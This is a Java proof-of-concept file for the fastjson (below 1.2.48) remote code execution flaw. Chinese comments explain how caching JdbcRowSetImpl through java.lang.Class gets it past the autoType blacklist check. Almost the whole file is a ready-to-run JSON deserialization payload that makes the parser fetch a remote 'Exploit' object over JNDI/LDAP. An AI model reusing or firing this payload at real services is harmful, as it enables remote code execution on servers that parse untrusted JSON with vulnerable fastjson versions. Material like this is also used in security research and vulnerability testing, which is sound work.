package com.test.fastjson;

import com.alibaba.fastjson.JSON;

/**
 *
 *fastjson < 1.2.48 RCE
 *高版本JEP290后需开启：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 *
 * 先通过java.lang.Class把com.sun.rowset.JdbcRowSetImpl加载进fastjson缓存
 * checkAutoType方法的缺陷（先通过缓存查询，有则立马返回，JdbcRowSetImpl否则检查黑名单hash）绕过黑名单和autoType的检查
 */

public class JdbcRowSetImpl {

    public static void main(String[] args) {

        String payload = "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}]";

        JSON.parse(payload);
    }
}
